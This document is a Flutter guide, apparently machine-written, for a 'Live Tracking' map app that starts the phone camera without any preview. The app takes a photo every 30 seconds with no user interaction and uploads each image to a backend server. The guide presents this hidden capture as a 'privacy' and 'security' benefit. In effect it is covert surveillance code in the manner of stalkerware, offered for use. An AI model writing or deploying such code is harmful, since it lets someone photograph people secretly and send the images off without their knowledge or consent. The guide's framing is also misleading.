# Flutter Silent Camera Capture Guide

This guide shows how to capture camera images without displaying them on the screen.

## 1. Camera Service for Silent Capture

Create `services/silent_camera_service.dart`:

```dart
import 'dart:io';
import 'package:camera/camera.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class SilentCameraService {
  static CameraController? _controller;
  static bool _isCapturing = false;
  static bool _displayImage = false; // Control image display

  // Initialize camera without preview
  static Future<void> initializeCamera() async {
    try {
      final cameras = await availableCameras();
      if (cameras.isEmpty) return;

      _controller = CameraController(
        cameras[0],
        ResolutionPreset.high,
        enableAudio: false,
      );

      await _controller!.initialize();
    } catch (e) {
      print('Camera initialization error: $e');
    }
  }

  // Capture image silently (no preview)
  static Future<String?> captureImageSilently() async {
    if (_controller == null || !_controller!.value.isInitialized || _isCapturing) {
      return null;
    }

    try {
      _isCapturing = true;
      
      // Capture image without showing preview
      final XFile image = await _controller!.takePicture();
      
      // Save to local storage
      final String imagePath = await _saveImageLocally(image);
      
      // Send to backend if needed
      await _sendImageToBackend(imagePath);
      
      return imagePath;
    } catch (e) {
      print('Capture error: $e');
      return null;
    } finally {
      _isCapturing = false;
    }
  }

  // Save image locally without displaying
  static Future<String> _saveImageLocally(XFile image) async {
    final Directory directory = await getApplicationDocumentsDirectory();
    final String path = directory.path;
    final String fileName = '${DateTime.now().millisecondsSinceEpoch}.jpg';
    final File savedImage = File('$path/$fileName');
    
    await image.saveTo(savedImage.path);
    return savedImage.path;
  }

  // Send image to backend (optional)
  static Future<void> _sendImageToBackend(String imagePath) async {
    try {
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('http://localhost:3000/api/camera-capture'),
      );

      final imageFile = await http.MultipartFile.fromPath(
        'image',
        imagePath,
      );
      request.files.add(imageFile);

      final response = await request.send();
      print('Image sent to backend: ${response.statusCode}');
    } catch (e) {
      print('Error sending image to backend: $e');
    }
  }

  // Update camera settings from backend
  static Future<void> updateCameraSettings() async {
    try {
      final response = await http.get(
        Uri.parse('http://localhost:3000/api/camera-settings')
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final settings = data['data'];
        
        _displayImage = settings['displayImage'] ?? false;
        print('Camera settings updated - Display image: $_displayImage');
      }
    } catch (e) {
      print('Error getting camera settings: $e');
    }
  }

  // Set camera mode (capture only vs capture + display)
  static Future<void> setCameraMode(bool captureOnly) async {
    try {
      final response = await http.post(
        Uri.parse('http://localhost:3000/api/camera'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'status': 1,
          'captureOnly': captureOnly,
        }),
      );

      if (response.statusCode == 200) {
        _displayImage = !captureOnly;
        print('Camera mode updated: Capture only = $captureOnly');
      }
    } catch (e) {
      print('Error setting camera mode: $e');
    }
  }

  // Get display status
  static bool get shouldDisplayImage => _displayImage;

  // Dispose camera
  static void dispose() {
    _controller?.dispose();
    _controller = null;
  }
}
```

## 2. Background Capture Widget

Create `widgets/background_camera.dart`:

```dart
import 'dart:async';
import 'package:flutter/material.dart';
import '../services/silent_camera_service.dart';

class BackgroundCamera extends StatefulWidget {
  final Widget child;

  const BackgroundCamera({required this.child, Key? key}) : super(key: key);

  @override
  _BackgroundCameraState createState() => _BackgroundCameraState();
}

class _BackgroundCameraState extends State<BackgroundCamera> {
  Timer? _captureTimer;

  @override
  void initState() {
    super.initState();
    _initializeBackgroundCapture();
  }

  Future<void> _initializeBackgroundCapture() async {
    await SilentCameraService.initializeCamera();
    await SilentCameraService.updateCameraSettings();
    
    // Start periodic capture (every 30 seconds)
    _captureTimer = Timer.periodic(Duration(seconds: 30), (timer) {
      if (!SilentCameraService.shouldDisplayImage) {
        SilentCameraService.captureImageSilently();
      }
    });
  }

  @override
  void dispose() {
    _captureTimer?.cancel();
    SilentCameraService.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return widget.child; // Just return child widget, no camera preview
  }
}
```

## 3. Map Screen with Silent Camera

Update your map screen:

```dart
import 'package:flutter/material.dart';
import '../widgets/background_camera.dart';
import '../services/silent_camera_service.dart';

class MapScreen extends StatefulWidget {
  @override
  _MapScreenState createState() => _MapScreenState();
}

class _MapScreenState extends State<MapScreen> {
  @override
  Widget build(BuildContext context) {
    return BackgroundCamera(
      child: Scaffold(
        appBar: AppBar(
          title: Text('Live Tracking'),
          actions: [
            // Camera mode toggle
            PopupMenuButton<bool>(
              icon: Icon(Icons.camera_alt),
              onSelected: (bool captureOnly) {
                SilentCameraService.setCameraMode(captureOnly);
              },
              itemBuilder: (context) => [
                PopupMenuItem(
                  value: true,
                  child: Text('Capture Only (No Display)'),
                ),
                PopupMenuItem(
                  value: false,
                  child: Text('Capture and Display'),
                ),
              ],
            ),
          ],
        ),
        body: Stack(
          children: [
            // Your Google Map widget
            GoogleMap(
              initialCameraPosition: CameraPosition(
                target: LatLng(37.7749, -122.4194),
                zoom: 12,
              ),
            ),
            
            // Conditionally show captured image
            if (SilentCameraService.shouldDisplayImage)
              Positioned(
                top: 50,
                right: 20,
                child: Container(
                  width: 100,
                  height: 100,
                  decoration: BoxDecoration(
                    border: Border.all(color: Colors.white),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(8),
                    child: Image.network(
                      'http://localhost:3000/latest-capture',
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
              ),
          ],
        ),
      ),
    );
  }
}
```

## 4. Main App Integration

Update your main app:

```dart
import 'package:flutter/material.dart';
import 'widgets/background_camera.dart';
import 'screens/map_screen.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Live Tracking',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: BackgroundCamera(
        child: MapScreen(),
      ),
    );
  }
}
```

## 5. Backend Endpoint for Image Capture

Add this to your backend routes:

```javascript
// In route.js
router.post('/camera-capture', upload.single('image'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No image provided' });
    }

    // Process captured image silently
    console.log('Silent camera capture received:', req.file.originalname);
    
    // Save image without displaying
    // Your image processing logic here
    
    res.status(200).json({ 
      message: 'Image captured silently',
      filename: req.file.originalname 
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
```

## Usage

### Enable Silent Capture (No Display)
```dart
await SilentCameraService.setCameraMode(true);
```

### Enable Display Capture
```dart
await SilentCameraService.setCameraMode(false);
```

### Manual Silent Capture
```dart
await SilentCameraService.captureImageSilently();
```

## Features

✅ **Silent Capture**: Camera works without showing preview
✅ **Background Operation**: Captures images in background
✅ **Configurable Display**: Control whether to show captured images
✅ **Backend Integration**: Sends images to server automatically
✅ **Timer-based**: Periodic capture without user interaction
✅ **Memory Efficient**: No unnecessary UI updates

## Benefits

- **Privacy**: Images captured without displaying on screen
- **Performance**: No UI overhead from camera preview
- **Flexibility**: Toggle between silent and display modes
- **Security**: Images processed server-side without local display
